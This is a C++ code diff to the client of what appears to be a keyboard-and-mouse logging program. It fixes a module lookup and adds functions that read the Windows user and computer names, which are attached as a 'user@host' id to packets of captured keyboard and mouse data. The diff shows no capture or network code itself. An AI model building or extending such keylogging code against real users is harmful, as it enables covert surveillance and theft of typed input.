@@ -3,6 +3,8 @@
 //
 
 #include <iostream>
+#include <windows.h>
+#include <Lmcons.h>
 #include "client/Command.hpp"
 
 Command::Command() {}
@@ -18,12 +20,34 @@ bool                        Command::process(std::map<char, Module> modules, std
     boost::archive::text_oarchive   ar(os);
     char                            code = received[0];
 
-    Module                          module; // = modules[code];
-    t_paquet                       *data = getMessageFormat(module);
-  ar & data;
-  if (data == NULL)
-    return false;
-  return true;
+    Module                          module = modules[code];
+    t_paquet                        *data = getMessageFormat(module);
+    ar & data;
+    if (data == NULL)
+        return false;
+    return true;
+}
+
+std::string                 Command::getUsername()
+{
+    TCHAR name [ UNLEN + 1 ];
+    DWORD size = UNLEN + 1;
+    std::string user;
+
+    GetUserName((TCHAR*)name, &size);
+    user = name;
+    return user;
+}
+
+std::string                 Command::getHostname()
+{
+    TCHAR  infoBuf[128];
+    DWORD  bufCharCount = 128;
+    std::string host;
+
+    GetComputerName(infoBuf, &bufCharCount);
+    host = infoBuf;
+    return host;
 }
 
 /*
@@ -31,17 +55,16 @@ bool                        Command::process(std::map<char, Module> modules, std
  */
 t_paquet                    *Command::getMessageFormat(Module module)
 {
-    size_t      dataMax = 512 / module.getDataSize();
     t_paquet    *data = new t_paquet;
 
-    data->kbData = NULL;
-    data->opcode = 0;
+    data->kbdata = NULL;
+    data->msdata = NULL;
     data->opcode = module.getOpcode();
-  data->mouseData = NULL;
-    for (unsigned int i = 0; i < dataMax; i++) {
-        module.addNextData(data);
-    }
-  if (data->kbData == NULL && data->mouseData == NULL)
-    return NULL;
+    data->id = this->getUsername();
+    data->id += "@";
+    data->id += this->getHostname();
+    module.getDatas(data);
+    if (data->kbdata == NULL && data->msdata == NULL)
+        return NULL;
     return data;
 }
